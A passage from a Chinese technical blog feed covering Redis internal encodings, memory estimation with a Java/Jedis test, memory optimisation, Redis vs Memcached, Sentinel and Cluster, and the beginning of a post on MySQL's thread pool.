title="内部编码"></a>内部编码</h5><p>有序集合的内部编码可以是压缩列表（ziplist）或跳跃表（skiplist）。ziplist在列表和哈希中都有使用，前面已经讲过，这里略过不提。</p><p>跳跃表是一种有序数据结构，通过在每个节点中维持多个指向其它节点的指针，从而达到快速访问节点的目的。</p><p>除了跳跃表，实现有序数据结构的另一种典型实现是平衡树；大多数情况下，跳跃表的效率可以和平衡树媲美，且跳跃表实现比平衡树简单很多，因此Redis中选用跳跃表代替平衡树。</p><p>跳跃表支持平均O(logN)、最坏O(N)的复杂点进行节点查找，并支持顺序操作。Redis的跳跃表实现由zskiplist和zskiplistNode两个结构组成：前者用于保存跳跃表信息（如头结点、尾节点、长度等），后者用于表示跳跃表节点。具体结构相对比较复杂，略。</p><h5 id="编码转换-4"><a href="#编码转换-4" class="headerlink" title="编码转换"></a>编码转换</h5><p>只有同时满足下面两个条件时，才会使用压缩列表：</p><ul><li>有序集合中元素数量小于128个；</li><li>有序集合中所有成员长度都不足64字节。</li></ul><p>如果有一个条件不满足，则使用跳跃表；且编码只可能由压缩列表转化为跳跃表，反方向则不可能。</p><p>下图展示了有序集合编码转换的特点：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic16.webp"><h3 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h3><p>了解Redis的内存模型之后，下面通过几个例子说明其应用。</p><h4 id="估算Redsi内存使用量"><a href="#估算Redsi内存使用量" class="headerlink" title="估算Redsi内存使用量"></a>估算Redsi内存使用量</h4><p>要估算Redis中的数据占据的内存大小，需要对Redis的内存模型有比较全面的了解，包括前面介绍的hashtable、SDS、RedisObject、各种对象类型的编码方式等。</p><p>下面以最简单的字符串类型来进行说明：</p><p>假设有90000个键值对，每个key的长度是7个字节，每个value的长度也是7个字节（且key和value都不是整数）。</p><p>下面来估算这90000个键值对所占用的空间。</p><p>在估算占据空间之前，首先可以判定字符串类型使用的编码方式：embstr。90000个键值对占据的内存空间主要可以分为两部分：一部分是90000个dictEntry占据的空间；一部分是键值对所需要的bucket空间。</p><p>每个dictEntry占据的空间包括：</p><ul><li>一个dictEntry，24字节，jemalloc会分配32字节的内存块。</li><li>一个key，7字节，所以SDS(key)需要7+9=16个字节，jemalloc会分配16字节的内存块。</li><li>一个RedisObject，16字节，jemalloc会分配16字节的内存块。</li><li>一个value，7字节，所以SDS(value)需要7+9=16个字节，jemalloc会分配16字节的内存块。</li><li>综上，一个dictEntry需要32+16+16+16=80个字节。</li></ul><p>bucket空间：bucket数组的大小为大于90000的最小的2^n，是131072，每个bucket元素为8字节（因为64位系统中指针大小为8字节）。</p><p>因此，可以估算出这90000个键值对占据的内存大小为：90000<em>80 + 131072</em>8 = 8248576。</p><p>下面写个程序在Redis中验证一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTest</span> </span>&#123;</span><br><span class="line">　　<span class="keyword">public</span> <span class="keyword">static</span> Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">"localhost"</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">　　　　Long m1 = Long.valueOf(getMemory());</span><br><span class="line">　　　　insertData();</span><br><span class="line">　　　　Long m2 = Long.valueOf(getMemory());</span><br><span class="line">　　　　System.out.println(m2 - m1);</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertData</span><span class="params">()</span></span>&#123;</span><br><span class="line">　　　　<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10000</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">　　　　　　jedis.set(<span class="string">"aa"</span> + i, <span class="string">"aa"</span> + i); <span class="comment">//key和value长度都是7字节，且不是整数</span></span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getMemory</span><span class="params">()</span></span>&#123;</span><br><span class="line">　　　　String memoryAllLine = jedis.info(<span class="string">"memory"</span>);</span><br><span class="line">　　　　String usedMemoryLine = memoryAllLine.split(<span class="string">"\r\n"</span>)[<span class="number">1</span>];</span><br><span class="line">　　　　String memory = usedMemoryLine.substring(usedMemoryLine.indexOf(<span class="string">':'</span>) + <span class="number">1</span>);</span><br><span class="line">　　　　<span class="keyword">return</span> memory;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：8247552</p><p>理论值与结果值误差在万分之1.2，对于计算需要多少内存来说，这个精度已经足够了。之所以会存在误差，是因为在我们插入90000条数据之前Redis已分配了一定的bucket空间，而这些bucket空间尚未使用。</p><p>作为对比将key和value的长度由7字节增加到8字节，则对应的SDS变为17个字节，jemalloc会分配32个字节，因此每个dictEntry占用的字节数也由80字节变为112字节。此时估算这90000个键值对占据内存大小为：90000<em>112 + 131072</em>8 = 11128576。</p><p>在Redis中验证代码如下（只修改插入数据的代码）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertData</span><span class="params">()</span></span>&#123;</span><br><span class="line">　　<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10000</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">　　　　jedis.set(<span class="string">"aaa"</span> + i, <span class="string">"aaa"</span> + i); <span class="comment">//key和value长度都是8字节，且不是整数</span></span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：11128576；估算准确。</p><p>对于字符串类型之外的其它类型，对内存占用的估算方法是类似的，需要结合具体类型的编码方式来确定。</p><h4 id="优化内存占用"><a href="#优化内存占用" class="headerlink" title="优化内存占用"></a>优化内存占用</h4><p>了解Redis的内存模型，对优化Redis内存占用有很大帮助。下面介绍几种优化场景：</p><h5 id="利用jemalloc特性进行优化"><a href="#利用jemalloc特性进行优化" class="headerlink" title="利用jemalloc特性进行优化"></a>利用jemalloc特性进行优化</h5><p>上一小节所讲述的90000个键值便是一个例子。由于jemalloc分配内存时数值是不连续的，因此key/value字符串变化一个字节，可能会引起占用内存很大的变动，在设计时可以利用这一点。</p><p>例如，如果key的长度如果是8个字节，则SDS为17字节，jemalloc分配32字节；此时将key长度缩减为7个字节，则SDS为16字节，jemalloc分配16字节；则每个key所占用的空间都可以缩小一半。</p><h5 id="使用整型-长整型"><a href="#使用整型-长整型" class="headerlink" title="使用整型/长整型"></a>使用整型/长整型</h5><p>如果是整型/长整型，Redis会使用int类型（8字节）存储来代替字符串，可以节省更多空间。因此在可以使用长整型/整型代替字符串的场景下，尽量使用长整型/整型。</p><h5 id="共享对象"><a href="#共享对象" class="headerlink" title="共享对象"></a>共享对象</h5><p>利用共享对象，可以减少对象的创建（同时减少了RedisObject的创建），节省内存空间。</p><p>目前Redis中的共享对象只包括10000个整数（0-9999），可以通过调整REDIS_SHARED_INTEGERS参数提高共享对象的个数。例如将REDIS_SHARED_INTEGERS调整到20000，则0-19999之间的对象都可以共享。</p><p>考虑这样一种场景：论坛网站在Redis中存储了每个帖子的浏览数，而这些浏览数绝大多数分布在0-20000之间，这时候通过适当增大REDIS_SHARED_INTEGERS参数，便可以利用共享对象节省内存空间。</p><h5 id="避免过度设计"><a href="#避免过度设计" class="headerlink" title="避免过度设计"></a>避免过度设计</h5><p>然而需要注意的是，不论是哪种优化场景，都要考虑内存空间与设计复杂度的权衡；而设计复杂度会影响到代码的复杂度、可维护性。</p><p>如果数据量较小，那么为了节省内存而使得代码的开发、维护变得更加困难并不划算；还是以前面讲到的90000个键值对为例，实际上节省的内存空间只有几MB。但是如果数据量有几千万甚至上亿，考虑内存的优化就比较必要了。</p><h4 id="关注内存碎片率"><a href="#关注内存碎片率" class="headerlink" title="关注内存碎片率"></a>关注内存碎片率</h4><p>内存碎片率是一个重要的参数，对Redis 内存的优化有重要意义。</p><p>如果内存碎片率过高（jemalloc在1.03左右比较正常），说明内存碎片多，内存浪费严重。这时便可以考虑重启Redis服务，在内存中对数据进行重排，减少内存碎片。</p><p>如果内存碎片率小于1，说明Redis内存不足，部分数据使用了虚拟内存（即swap）；由于虚拟内存的存取速度比物理内存差很多（2-3个数量级），此时Redis的访问速度可能会变得很慢。因此必须设法增大物理内存（可以增加服务器节点数量，或提高单机内存），或减少Redis中的数据。</p><p>要减少Redis中的数据，除了选用合适的数据类型、利用共享对象等，还有一点是要设置合理的数据回收策略（maxmemory-policy），当内存达到一定量后，根据不同的优先级对内存进行回收。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis特性与优势</title>
      <link href="/2019/04/02/2019-04-02-Redis%E7%89%B9%E6%80%A7%E4%B8%8E%E4%BC%98%E5%8A%BF/"/>
      <url>/2019/04/02/2019-04-02-Redis%E7%89%B9%E6%80%A7%E4%B8%8E%E4%BC%98%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 同为分布式缓存，为何Redis更胜一筹？ <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="常用的分布式缓存的对比"><a href="#常用的分布式缓存的对比" class="headerlink" title="常用的分布式缓存的对比"></a>常用的分布式缓存的对比</h3><p>如今，市面上的缓存解决方案已经逐步成熟了，今天我将选取其中一些代表性的方案包括Redis、Memcached和Tair进行对比，帮助大家在生产实践中更好地进行技术选型。</p><p>常用的分布式缓存包括Redis、Memcached和阿里巴巴的Tair（见下表），因为Redis提供的数据结构比较丰富且简单易用，所以Redis的使用广泛。</p><img src="/2019/04/02/2019-04-02-Redis特性与优势/pic1.webp"><p>下面我们从9个大方面来对比最常用的Redis和Memcached。</p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>Redis一共支持5中数据类型，每种数据类型对应不同的数据结构，有简单的String类型、压缩串、跳跃表等。跳跃表是比较新型的数据结构，常用于高性能的查找，可以达到log<sub>2</sub>N的查询速度，而跳跃表相对于红黑树，在更新时变更的节点较少，更易于实现并发操作。</p><p>Memcache只支持对键值对的存储，并不支持其他数据结构。</p><h4 id="线程模型"><a href="#线程模型" class="headerlink" title="线程模型"></a>线程模型</h4><p>Redis使用单线程实现，Memcache等使用多线程实现，因此我们不推荐在Redis中存储太大的内存，否则会阻塞其他请求。</p><p>因为缓存操作都是内存操作，只有很少的计算操作，所以在单线程下性能很好。Redis实现的单线程的非阻塞网络I/O模型，适合快速地操作逻辑，有复杂的长逻辑时会影响性能。对于长逻辑应该配置多个实例来提高多核CPU的利用率。也就是说，可以使用单机器多端口来配置多个实例，官方的推荐是一台机器使用8个实例。</p><p>它实现的非阻塞I/O模型基于Libevent库中关于Epoll的两个文件加上自己简单实现的事件通知模型，简单小巧，作者的思想就是保持实现简单、减少依赖。由于服务器中只有一个线程，因此提供了管道来合并请求和批量执行，缩短了通信消耗的时间。</p><p>Memcache也使用了非阻塞I/O模型，但是使用了多线程，可以应用于多种场景，请求的逻辑可大可小、可长可短，不会出现一个逻辑复杂的请求阻塞对其它请求的响应的场景。它直接依赖Libevent库实现，依赖比较复杂，损失了在一些特定环境下的高性能。</p><h4 id="持久机制"><a href="#持久机制" class="headerlink" title="持久机制"></a>持久机制</h4><p>Redis提供了两种持久机制，包括RDB和AOF，前者是定时的持久机制，但在出现宕机时可能会出现数据丢失，后者是基于操作日志的持久机制。</p><p>Memcache并不提供持久机制，因为Memcache的设计理念就是设计一个单纯的缓存，缓存的数据都是临时的，不应该是持久化的，也不应该是一个大数据的数据库，缓存未命中时回源查询数据库是天经地义，但可以通过第三方库MemcacheDB来支持它的持久性。</p><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>常见的Redis Java客户端Jedis使用阻塞I/O，但可以配置连接池，并提供了一致性哈希分片的逻辑，也可以使用开源的客户端分片框架Redis。</p><p>Memcache的客户端包括Memcache Java Client、Spy Client、XMemcache等，Memcache Java Client使用阻塞I/O，而Spy Client/XMemcache使用非阻塞I/O。</p><p>我们知道，阻塞I/O不需要额外的线程，非阻塞I/O会开启额外的请求线程（在Boss线程池里）监听端口，一个请求在处理后就释放工作者线程（在Worker线程池中），请求线程在监听到有返回结果时，一旦有I/O返回结果就被唤醒，然后开始处理响应数据并写回网络Socket连接，所以从理论上来讲，非阻塞I/O的吞吐量和响应能力会更高。</p><h4 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h4><p>Redis支持主从节点复制配置，从节点可使用RDB和缓存的AOF命令进行同步和恢复。Redis还支持Sentinel和Cluster（从3.0版本开始）等高可用集群方案。</p><p>Memecache不支持高可用模型，可使用第三方Megagent代理，当一个实例宕机时，可以连接另外一个实例来实现。</p><h4 id="对队列的支持"><a href="#对队列的支持" class="headerlink" title="对队列的支持"></a>对队列的支持</h4><p>Redis本身支持lpush/brpop、publish/subscribe/psubscribe等队列和订阅模式。</p><p>Memcache不支持队列，可通过第三方MemcachQ来实现。</p><h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>Redis提供了一些在一定程度上支持线程安全和事务的命令，例如：multi/exec、watch、inc等。由于Redis服务器是单线程的，任何单一请求的服务器操作命令都是原子的，但跨客户端的操作并不保证原子性，所以对于同一个连接的多个操作序列也不保证事务。</p><p>Memcached的单个命令也是线程安全的，单个连接的多个命令序列不是线程安全的，它也提供了inc等线程安全的自加命令，并提供了gets/cas保证线程安全。</p><h4 id="数据淘汰策略"><a href="#数据淘汰策略" class="headerlink" title="数据淘汰策略"></a>数据淘汰策略</h4><p>Redis提供了丰富的淘汰策略，包括maxmemory、maxmemory-policy、volatile-lru、allkeys-lru、volatile-random、allkeys-random、volatile-ttl、noeviction(return error)等。</p><p>Memecache在容量达到指定值后，就基于LRU（Least Recently Used）算法自动删除不使用的缓存。在某些情况下LRU机制反倒会带来麻烦，会将不期待的数据从内存中清除，在这种情况下启动Memcache时，可以通过“M”参数禁止LRU算法。</p><h4 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h4><p>Redis为了屏蔽不同平台之间的差异及统计内存占用量等，对内存分配函数进行了一层封装，在程序中统一使用zmalloc、zfree系列函数，这些函数位于zmalloc.h/zmalloc.c文件中。封装就是为了屏蔽底层平台的差异，同时方便自己实现相关的统计函数。具体的实现方式如下：</p><ul><li>若系统中存在Google的TC_MALLOC库，则使用tc_malloc一族的函数代替原本的malloc一族的函数。</li><li>若当前系统是Mac系统，则使用系统的内存分配函数。</li><li>对于其它情况，在每一段分配好的空间前面同时多分配一个定长的字段，用来记录分配的空间大小，通过这种方式来实现简单有效的内存分配。</li></ul><p>Memcache采用slab table的方式分配内存，首先把可得的内存按照不同的大小来分类，在使用时根据需求找到最接近于需求大小的块分配，来减少内存碎片，但是这需要进行合理配置才能达到效果。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>Redis和Memcached的区别</p><ul><li>Redis和Memcache都是将数据存放在内存中，都是内存数据库。但是Memcache还可以缓存其他东西，比如图片、视频</li><li>Redis不只支持简单的k/v类型的数据，同时还提供list、set、hash等数据结构的存储</li><li>虚拟内存，当物理内存用完时Redis可以将一些很久没有用到的value交换到磁盘</li><li>过期策略，memcache在set时就指定，例如 <code>setkey1008</code>即永不过期，redis可以通过expire设定，例如： <code>expire name10</code></li><li>分布式，设定memcache集群，利用magent做一主多从；redis也可以做一主多从。</li><li>存储安全，memcache挂掉后，数据没了；redis可以定期保存在磁盘（持久化）</li><li>灾难恢复，memcache挂掉后数据不可恢复；redis数据丢失后可以通过aof恢复</li><li>redis支持数据的备份，即master-slave模式的数据备份</li><li>应用场景不同：redis除了可以做nosql数据库之外，还能做消息队列、数据堆栈和数据缓存等。memcache适合于缓存sql语句、数据集、用户临时性数据、延迟查询数据和session等</li></ul><p>从上面的对比可以看到，Redis在实现和使用上更简单，但是功能更强大，效率更高，应用也更广泛。下面将对Redis进行初步介绍，给初学者一个初体验式的学习引导。</p><h3 id="Redis初体验"><a href="#Redis初体验" class="headerlink" title="Redis初体验"></a>Redis初体验</h3><p>Redis是一个能够存储多种数据对象的开源Key-Value存储系统，使用ANSI C语言编写，可以仅仅当作内存数据库使用，也可以作为以日志为存储方式的数据库系统，并提供多种语言的API。</p><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>我们通常把Redis当作一个非本地缓存来使用，很少用到它的一些高级功能。在使用中最容易出问题的是用Redis来保存JSON数据，因为Redis不像Elasticsearch或者PostgreSQL那样可以很好地支持JSON数据。所以我们经常把JSON当作一个大的String直接放到Redis中，但现在的JSON数据都是连环嵌套的，每次更新时都要先获取整个JSON，然后更改其中一个字段再放上去。</p><p>一个常见的JSON数据的Java对象定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commodity</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> price;</span><br><span class="line"><span class="keyword">private</span> String title;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在海量请求的前提下，在Redis中每次更新一个字段，比如销量字段，都会产生较大的流量。在实际情况下，JSON字符串往往非常复杂，体积达到数百KB都是有可能的，导致在频繁更新数据时使网络I/O跑满，甚至导致系统超时、崩溃。</p><p>因此，Redis官方推荐采用哈希来保存对象，比如有3个商品对象，ID分别是123、124和12345，我们通过哈希把它们保存在Redis中，在更新其中的字段时可以这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HSET commodity:123 price 100</span><br><span class="line">HSET commodity:124 price 101</span><br><span class="line">HSET commodity:12345 price 101</span><br><span class="line"></span><br><span class="line">HSET commodity:123 title banana</span><br><span class="line">HSET commodity:124 title apple</span><br><span class="line">HSET commodity:12345 title orange</span><br></pre></td></tr></table></figure><p>也就是说，用商品的类型名和ID组成一个Redis哈希对象的KEY。在获取某一属性时只需这样做就可以获取单独的属性：HGET commodity: 12345。</p><h4 id="Redis的高可用方案：哨兵"><a href="#Redis的高可用方案：哨兵" class="headerlink" title="Redis的高可用方案：哨兵"></a>Redis的高可用方案：哨兵</h4><p>Redis官方推出了一个集群管理工具，叫作哨兵（Sentinel），负责在节点中选出主节点，按照分布式集群的管理办法来操作集群节点的上线、下线、监控、提醒、自动故障切换（主备切换），且实现了著名的RAFT选主协议，从而保证了系统选主的一致性。</p><p>这里给出一个哨兵的通用部署方案。哨兵节点一般至少要部署3份，可以和被监控的节点放在一个虚拟机中，常见的哨兵部署如图所示。</p><img src="/2019/04/02/2019-04-02-Redis特性与优势/pic2.webp"><p>在这个系统中，初始状态下的机器A是主节点，机器B和机器C是从节点。</p><p>由于有3个哨兵节点，每个机器运行1个哨兵节点，所以这里设置quorum = 2，也就是在主节点无响应后，有至少两个哨兵无法与主节点通信，则认为主节点宕机，然后在从节点中选举新的主节点来使用。</p><p>在发生网络分区时，若机器A所在的主机网络不可用，则机器B和机器C上的两个Sentinel实例会启动failover并把机器B选举为主节点。</p><p>Sentinel集群的特性保证了机器B和机器C上的两个Sentinel实例得到了关于主节点的最新配置。但机器A上的Sentinel节点依然持有旧的配置，因为它与外界隔离了。</p><p>在网络恢复后，我们知道机器A上的Sentinel实例将会更新它的配置。但是，如果客户端所连接的主机节点也被网络隔离，则客户端将依然可以向机器A的Redis节点写数据，但在网络恢复后，机器A的Redis节点就会变成一个从节点，那么在网络隔离期间，客户端向机器A的Redis节点写入的数据将会丢失，这是不可避免的。</p><p>如果把Redis当作缓存来使用，那么我们也许能容忍这部分数据的丢失，但若把Redis当作一个存储系统来使用，就无法容忍这部分数据的丢失了，因为Redis采用的是异步复制，在这样的场景下无法避免数据的丢失。</p><p>在这里，我们可以通过以下配置来配置每个Redis实例，使得数据不会丢失：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min-slaves-to-write 1</span><br><span class="line">min-slaves-max-lag 10</span><br></pre></td></tr></table></figure><p>通过上面的配置，当一个Redis是主节点时，如果它不能向至少一个从节点写数据（上面的min-slaves-to-write指定了slave的数量），则它将会拒绝接收客户端的写请求。由于复制是异步的，所以主节点无法向从节点写数据就意味着从节点要么断开了连接，要么没在指定的时间内向主节点发送同步数据的请求。</p><p>所以，采用这样的配置可排除网络分区后主节点被孤立但仍然写入数据，从而导致数据丢失的场景。</p><h4 id="Redis集群"><a href="#Redis集群" class="headerlink" title="Redis集群"></a>Redis集群</h4><p>Redis在3.0中也引入了集群的概念，用于解决一些大数据量和高可用的问题，但是，为了达到高性能的目的，集群不是强一致性的，使用的是异步复制，在数据到主节点后，主节点返回成功，数据被异步地复制给从节点。</p><p>首先，我们来学习Redis的集群分片机制。Redis使用CRC16(key) mod 16384进行分片，一共分16384个哈希槽，比如若集群有3个节点，则我们按照如下规则分配哈希槽：</p><ul><li>A节点包含0-5500的哈希槽；</li><li>B节点包含5500-11000的哈希槽；</li><li>C节点包含11000-16384的哈希槽。</li></ul><p>这里设置了3个主节点和3个从节点，集群分片如图所示。</p><img src="/2019/04/02/2019-04-02-Redis特性与优势/pic3.webp"><p>图中共有3个Redis主从服务器的复制节点，其中任意两个节点之间都是相互连通的，客户端可以与其中任意一个节点相连接，然后访问集群中的任意一个节点，对其进行存取和其他操作。</p><p>那Redis是怎么做到的呢？首先，在Redis的每个节点上都会存储哈希槽信息，我们可以将它理解为是一个可以存储两个数值的变量，这个变量的取值范围是0-16383。根据这些信息，我们就可以找到每个节点负责的哈希槽，进而找到数据所在的节点。</p><p>Redis集群实际上是一个集群管理的插件，当我们提供一个存取的关键字时，就会根据CRC16的算法得出一个结果，然后把结果除以16384求余数，这样每个关键字都会对应一个编号为0-16383的哈希槽，通过这个值找到对应的插槽所对应的节点，然后直接自动跳转到这个对应的节点上进行存取操作。但是这些都是由集群的内部机制实现的，我们不需要手工实现。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQ线程池</title>
      <link href="/2019/03/30/2019-03-30-MySQL%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2019/03/30/2019-03-30-MySQL%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 理解和使用MySQL线程池，看这篇文章就够了 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="为何要使用MySQL线程池"><a href="#为何要使用MySQL线程池" class="headerlink" title="为何要使用MySQL线程池"></a>为何要使用MySQL线程池</h3><p>在介绍为什么要使用线程池之前，我们都知道随着DB访问量越来越大，DB的响应时间也会随之越来越大，如下图：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic1.webp"><p>而DB的访问大到一定程度时，DB的吞吐量也会出现下降，并且会越来越差，如下图所示：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic2.webp"><p>那么是否有什么方式，能实现随着DB的访问量越来越大，DB始终表现出最佳的性能呢？类似下图的表现：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic3.webp"><p>答案就是今天要重点介绍的线程池功能。总结一下，使用线程池的理由有两个：</p><h4 id="减少线程重复创建与销毁部分的开销，提高性能"><a href="#减少线程重复创建与销毁部分的开销，提高性能" class="headerlink" title="减少线程重复创建与销毁部分的开销，提高性能"></a>减少线程重复创建与销毁部分的开销，提高性能</h4><p>线程池技术通过预先创建一定数量的线程，在监听到有新的请求时，线程池直接从现有的线程中分配一个线程来提供服务，服务结束后这个线程不会直接销毁，而是又去处理其他的请求。这样就避免了线程和内存对象频繁创建和销毁，减少了上下文切换，提高了资源利用率，从而在一定程度上提高了系统的性能和稳定性。</p><h4 id="对系统起到保护作用"><a href="#对系统起到保护作用" class="headerlink" title="对系统起到保护作用"></a>对系统起到保护作用</h4><p>线程池技术限制了并发线程数，相当于限制了MySQL的runing线程数，无论系统目前有多少连接或者请求，超过最大设置的线程数的都需要排队，让系统保持高性能水平，从而防止DB出现雪崩，对底层DB起到保护作用。</p><p>可能有人会问，使用连接池能否也达到类似的效果？</p><p>也许有的DBA会把线程池和连接池混淆，但其实两者是有很大区别的：连接池一般在客户端设置，而线程池是在DB服务器上配置；另外连接池可以起到避免了连接频繁创建和销毁，但是无法控制MySQL活动线程数的目标，在高并发场景下，无法起到保护DB的作用。比较好的方式是将连接池和线程池结合起来使用。</p><h3 id="MySQL线程池介绍"><a href="#MySQL线程池介绍" class="headerlink" title="MySQL线程池介绍"></a>MySQL线程池介绍</h3><h4 id="MySQL线程池简介"><a href="#MySQL线程池简介" class="headerlink" title="MySQL线程池简介"></a>MySQL线程池简介</h4><p>为了解决one-thread-per-connection(每个连接一个线程)存在的频繁创建和销毁大量线程以及高并发情况下DB雪崩的问题，实现DB在高并发环境依然能保持较高的性能。</p><p>Oracle和MariaDB都推出了ThreadPool方案，目前Oracle的Thread pool实现为Plugin方式，并且只添加到在Enterprise版本中，Percona移植了MariaDB的Thread pool功能，并做了进一步的优化。本文的环境就基于Percona MySQL 5.7版本。</p><h4 id="MySQL线程池架构"><a href="#MySQL线程池架构" class="headerlink" title="MySQL线程池架构"></a>MySQL线程池架构</h4><p>MySQL的Thread pool（线程池）被划分为多个group（组），每个组又有对应的工作线程，整体的工作逻辑还是比较复杂，下面我试图通过简单的方式来介绍MySQL线程池的工作原理。</p><h5 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h5><p>首先来看看Thread Pool的架构图：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic4.webp"><h5 id="Thread-Pool的组成"><a href="#Thread-Pool的组成" class="headerlink" title="Thread Pool的组成"></a>Thread Pool的组成</h5><p>从架构图中可以看到Thread Pool由一个Timer线程和多个Thread Group组成，而每个Thread Group又由两个队列、一个listener线程和多个worker线程构成。下面分别来介绍各个部分的作用：</p><ul><li><strong>队列（高优先级队列和低优先级队列）</strong></li></ul><p>用来存放待执行的IO任务，分为高优先级队列和低优先级队列，高优先级队列的任务会优先被处理。</p><p>什么任务会放在高优先级队列呢？</p><p>事务中的语句会放到高优先级队列中，比如一个事务中有两个update的SQL，有1个已经执行，那么另外一个update的任务就会放在高优先级中。这里需要注意，如果是非事务引擎，或者开启了Autocommit的事务引擎，都会放到低优先级队列中。</p><p>还有一种情况会将任务放到高优先级队列中，如果语句在低优先级队列停留太久，该语句也会移到高优先级队列中，防止饿死。</p><ul><li><strong>listener线程</strong></li></ul><p>listener线程监听该线程group的语句，并确定当自己转变成worker线程，是立即执行对应的语句还是放到队列中，判断的标准是看队列中是否有待执行的语句。</p><p>如果队列中待执行的语句数量为0，而listener线程转换成worker线程，并立即执行对应的语句。如果队列中待执行的语句数量不为0，则认为任务比较多，将语句放入队列中，让其他的线程来处理。这里的机制是为了减少线程的创建，因为一般SQL执行都非常快。</p><ul><li><strong>worker线程</strong></li></ul><p>worker线程是真正干活的线程。</p><ul><li><strong>Timer线程</strong></li></ul><p>Timer线程是用来周期性检查group是否处于处于阻塞状态，当出现阻塞的时候，会通过唤醒线程或者新建线程来解决。</p><p>具体的检测方法为：通过queue_event_count的值和IO任务队列是否为空来判断线程组是否为阻塞状态。</p><p>每次worker线程检查队列中任务的时候，queue_event_count会+1，每次Timer检查完group是否阻塞的时候会将queue_event_count清0，如果检查的时候任务队列不为空，而queue_event_count为0，则说明任务队列没有被正常处理，此时该group出现了阻塞，Timer线程会唤醒worker线程或者新建一个wokrer线程来处理队列中的任务，防止group长时间被阻塞。</p><h5 id="Thread-Pool的是如何运作的？"><a href="#Thread-Pool的是如何运作的？" class="headerlink" title="Thread Pool的是如何运作的？"></a>Thread Pool的是如何运作的？</h5><p>下面描述极简的Thread 